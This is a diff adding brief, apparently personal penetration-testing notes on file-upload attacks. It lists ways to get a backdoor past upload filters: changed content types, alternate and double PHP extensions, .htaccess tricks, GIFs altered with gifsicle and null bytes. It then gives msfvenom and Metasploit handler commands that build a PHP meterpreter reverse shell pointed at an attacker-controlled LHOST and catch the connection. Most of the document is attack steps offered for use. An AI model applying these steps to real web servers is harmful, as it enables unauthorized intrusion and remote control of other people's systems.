@@ -1,0 +1,17 @@
+File_Upload:
+* backdoor
+* intercept & change content type
+* upload file extension with case sensitive + .httaccess
+* if php based apps - try upload extension php3,php4-5
+* double extension
+* gifsicle to change content of the GIF to upload backdoor
+* null-byte A41
+
+meterpreter:
+1.msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw > meterpreter.php
+2.upload it
+3. msf
+	use exploit/multi/handler
+	set PAYLOAD php/meterpreter/reverse_tcp
+	set LHOST <IP>
+	run
